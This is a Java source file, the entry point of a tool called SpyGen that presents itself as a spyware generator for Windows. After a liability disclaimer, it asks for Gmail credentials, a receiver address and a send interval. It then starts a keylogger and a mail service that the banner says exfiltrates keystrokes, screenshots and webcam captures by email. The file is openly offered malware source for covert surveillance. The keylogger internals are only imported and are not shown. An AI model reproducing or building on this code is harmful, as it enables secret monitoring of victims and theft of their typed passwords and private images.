package com.houarizegai.spygen;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.global.Utils;
import com.houarizegai.spygen.keylogger.Keylogger;
import com.houarizegai.spygen.mail.SenderService;

import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public class SpyGen {
    private static final String RESET = "\u001B[0;1m";
    private static final String BLACK = "\u001B[30;1m";
    private static final String RED = "\u001B[31;1m";
    private static final String GREEN = "\u001B[32;1m";
    private static final String YELLOW = "\u001B[33;1m";
    private static final String BLUE = "\u001B[34;1m";
    private static final String PURPLE = "\u001B[35;1m";
    private static final String CYAN = "\u001B[36;1m";
    private static final String WHITE = "\u001B[37;1m";

    private static Scanner mScanner = new Scanner(System.in);

    public static void main(String[] args) {
        checkSupportedOS();
        showMenu();
    }

    private static void checkSupportedOS() {
        if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
            System.out.println("[!] OS is not supported!");
            System.exit(0);
        }
    }

    private static void showMenu() {
        System.out.println(RED + "   SpyGen [Spyware Generator tool] " + GREEN + "  Version: 0.1   \n"
                + BLUE + "                    Written by Houari ZEGAI                        \n"
                + WHITE + "                                                                  \n"
                + YELLOW + "                      ** DISCLAIMER **                            \n"
                + WHITE + " THIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\n"
                + WHITE + " YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE  \n"
                + WHITE + " RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO         \n"
                + WHITE + " LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE       \n"
                + WHITE + " CAUSED BY THIS PROGRAM.                                          \n"
                + WHITE + "                                                                  \n"
                + WHITE + " Close this window if you wish to exit. Otherwise,                \n"
                + WHITE + " press [ENTER] key to continue..."
        );

        mScanner.nextLine();
        showFillInfo();
    }

    private static void showFillInfo() {
        clearScreen();
        System.out.println(""
                + RED + "          +---------------------------------------------------+\n"
                + RED + "    (__)  | " + YELLOW + "WARNING: Use Gmail account only!                  " + RED + "|\n"
                + RED + " (|)(00)  | " + WHITE + "E-mail will be sent when it reaches the specified " + RED + "|\n"
                + RED + "  |/(__)\\ | " + WHITE + "Data will send it in period time specified with   " + RED + "|\n"
                + RED + "  |_/ _|  | " + WHITE + "Keylogger, Screenshot and Webcam Capture.         " + RED + "|\n"
                + RED + "          +---------------------------------------------------+\n");

        System.out.println(YELLOW + "NOTE:" + WHITE + " Allow access to less secure apps on your gmail account.");
        System.out.println(WHITE + " -> https://www.google.com/settings/security/lesssecureapps");

        System.out.println(YELLOW + " GENERATE SPYWARE\n" + YELLOW + " --------------------------------------------");

        System.out.print(YELLOW + "[*] Enter your E-mail: " + WHITE);
        Settings.senderMail = mScanner.nextLine();
        while (!Utils.isValidMail(Settings.senderMail)) {
            System.out.print(YELLOW + "[*] Enter your E-mail: " + WHITE);
            Settings.senderMail = mScanner.nextLine();
        }

        System.out.print(YELLOW + "[*] Enter receiver E-mail: " + WHITE);
        Settings.receiverMail = mScanner.nextLine();
        while (!Utils.isValidMail(Settings.receiverMail)) {
            System.out.print(YELLOW + "[*] Enter receiver E-mail: " + WHITE);
            Settings.receiverMail = mScanner.nextLine();
        }

        System.out.print(YELLOW + "[*] Enter your Password: " + WHITE);
        Settings.senderPassword = mScanner.nextLine();
        while (Settings.senderPassword.equalsIgnoreCase("")) {
            System.out.print(YELLOW + "[*] Enter your Password: " + WHITE);
            Settings.senderPassword = mScanner.nextLine();
        }

        System.out.print(YELLOW + "[*] Enter period sending data (per second): " + WHITE);
        String periodSending = mScanner.nextLine();
        while (!periodSending.trim().matches("[0-9]+")) {
            System.out.print(YELLOW + "[*] Enter period sending data (per second): " + WHITE);
            periodSending = mScanner.nextLine();
        }
        Settings.periodSendingSeconds = Integer.parseInt(periodSending);

        System.out.println("\n"
                + GREEN + " +------------------------------------------+\n"
                + GREEN + "   Email: " + WHITE + Settings.senderMail + "\n"
                + GREEN + "   Password: " + WHITE + Settings.senderPassword + "\n"
                + GREEN + "   Receiver mail: " + WHITE + Settings.receiverMail+ "\n"
                + GREEN + "   Period sending data [per second]: " + WHITE + Settings.periodSendingSeconds + "\n"
                + GREEN + " +------------------------------------------+"
        );


        String optConfirm;
        do {
            System.out.print(YELLOW + "\n [*] The information above is correct? (y/n): " + WHITE);
            optConfirm = mScanner.nextLine();
        } while(optConfirm.trim().isEmpty());

        if(optConfirm.trim().equalsIgnoreCase("y")) {
            // start the sypware
            Keylogger.startKeylogger();
            new SenderService();
        } else if(optConfirm.trim().equalsIgnoreCase("n")) {
            waitSeconds(1);
            showFillInfo();
        } else {
            System.out.println("[*] Invalid option!");
            waitSeconds(1);
            showFillInfo();
        }
    }

    private static void waitSeconds(int time) {
        try {
            TimeUnit.SECONDS.sleep(time);
        } catch(InterruptedException ie) {
            ie.printStackTrace();
        }
    }

    private static void clearScreen() {
        for (int i = 0; i < 10; ++i) System.out.println();
    }

}